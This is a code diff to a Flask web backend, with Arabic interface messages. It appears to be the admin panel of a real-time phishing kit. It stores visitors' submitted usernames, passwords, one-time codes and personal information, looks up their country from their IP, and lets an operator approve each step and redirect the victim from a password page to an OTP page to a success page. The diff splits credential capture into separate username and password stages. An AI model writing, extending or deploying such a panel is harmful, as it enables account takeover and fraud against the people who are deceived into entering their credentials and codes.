@@ -44,7 +44,7 @@ class ClientRequest(db.Model):
     __tablename__ = "client_requests"
     id = db.Column(db.String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
     user_id = db.Column(db.String(36), db.ForeignKey("users.id"), nullable=False)
-    type = db.Column(db.String(50), nullable=False)  # login, otp, personal_info
+    type = db.Column(db.String(50), nullable=False)  # username, password, otp, login, personal_info
     data = db.Column(db.JSON, nullable=False)
     status = db.Column(Enum("pending", "approved", "rejected", name="request_status"), default="pending")
     timestamp = db.Column(db.DateTime, default=datetime.datetime.now)
@@ -153,7 +153,9 @@ def get_all_requests():
             "current_page": user.current_page,
             "last_activity": user.last_activity.isoformat() if user.last_activity else None,
             "data": user_data,
-            "login_status": next((r.status for r in sorted(user.requests, key=lambda x: x.timestamp, reverse=True) if r.type == 'login'), None),
+            "username_status": next((r.status for r in sorted(user.requests, key=lambda x: x.timestamp, reverse=True) if r.type == 'username'), None),
+            "password_status": next((r.status for r in sorted(user.requests, key=lambda x: x.timestamp, reverse=True) if r.type == 'password'), None),
+            "login_status": next((r.status for r in sorted(user.requests, key=lambda x: x.timestamp, reverse=True) if r.type in ('login', 'username', 'password')), None),
             "otp_status": next((r.status for r in sorted(user.requests, key=lambda x: x.timestamp, reverse=True) if r.type == 'otp'), None),
         })
 
@@ -183,12 +185,14 @@ def get_request_details(session_id):
         "country": user.country or "غير معروف",
         "current_page": user.current_page,
         "data": user_data,
-        "login_status": next((r.status for r in user.requests if r.type == 'login'), None),
+        "username_status": next((r.status for r in user.requests if r.type == 'username'), None),
+        "password_status": next((r.status for r in user.requests if r.type == 'password'), None),
+        "login_status": next((r.status for r in user.requests if r.type in ('login', 'username', 'password')), None),
         "otp_status": next((r.status for r in user.requests if r.type == 'otp'), None),
     })
 
 
-# ---- Admin Approve/Reject Login ----
+# ---- Admin Approve/Reject Username / Login ----
 @app.route("/admin/approve_login/<user_session_id>")
 def admin_approve_login(user_session_id):
     if not session.get("logged_in"):
@@ -196,16 +200,21 @@ def admin_approve_login(user_session_id):
     user = UserSession.query.filter_by(session_id=user_session_id).first()
     if not user:
         return jsonify({"status": "error", "message": "المستخدم غير موجود"}), 404
-    latest_login = None
+    latest_req = None
     for r in user.requests:
-        if r.type == 'login' and r.status == 'pending':
-            if latest_login is None or r.timestamp > latest_login.timestamp:
-                latest_login = r
-    if latest_login:
-        latest_login.status = "approved"
-        latest_login.admin_action_time = datetime.datetime.now()
+        if r.type in ('username', 'login', 'password') and r.status == 'pending':
+            if latest_req is None or r.timestamp > latest_req.timestamp:
+                latest_req = r
+    if latest_req:
+        latest_req.status = "approved"
+        latest_req.admin_action_time = datetime.datetime.now()
+        # تحديد التوجيه التلقائي بناء على نوع الطلب
+        if latest_req.type == 'username':
+            user.redirect_to = "password.html"
+        elif latest_req.type == 'password':
+            user.redirect_to = "otp.html"
     db.session.commit()
-    return jsonify({"status": "success", "message": "تمت الموافقة على تسجيل الدخول"})
+    return jsonify({"status": "success", "message": "تمت الموافقة بنجاح"})
 
 
 @app.route("/admin/reject_login/<user_session_id>")
@@ -215,16 +224,16 @@ def admin_reject_login(user_session_id):
     user = UserSession.query.filter_by(session_id=user_session_id).first()
     if not user:
         return jsonify({"status": "error", "message": "المستخدم غير موجود"}), 404
-    latest_login = None
+    latest_req = None
     for r in user.requests:
-        if r.type == 'login' and r.status == 'pending':
-            if latest_login is None or r.timestamp > latest_login.timestamp:
-                latest_login = r
-    if latest_login:
-        latest_login.status = "rejected"
-        latest_login.admin_action_time = datetime.datetime.now()
+        if r.type in ('username', 'login', 'password') and r.status == 'pending':
+            if latest_req is None or r.timestamp > latest_req.timestamp:
+                latest_req = r
+    if latest_req:
+        latest_req.status = "rejected"
+        latest_req.admin_action_time = datetime.datetime.now()
     db.session.commit()
-    return jsonify({"status": "success", "message": "تم رفض تسجيل الدخول"})
+    return jsonify({"status": "success", "message": "تم الرفض"})
 
 
 # ---- Admin Approve/Reject OTP ----
@@ -243,6 +252,7 @@ def admin_approve_otp(user_session_id):
     if latest_otp:
         latest_otp.status = "approved"
         latest_otp.admin_action_time = datetime.datetime.now()
+        user.redirect_to = "success.html"
     db.session.commit()
     return jsonify({"status": "success", "message": "تمت الموافقة على OTP"})
 
@@ -280,6 +290,7 @@ def submit_request():
         user, sid = get_or_create_user(current_page=request_type)
         user.current_page = request_type
         user.last_activity = datetime.datetime.now()
+        user.redirect_to = None # إعادة تعيين التوجيه عند إرسال طلب جديد للانتظار
         if not user.country:
             user.country = get_country_from_ip(user.ip_address)
         db.session.commit()
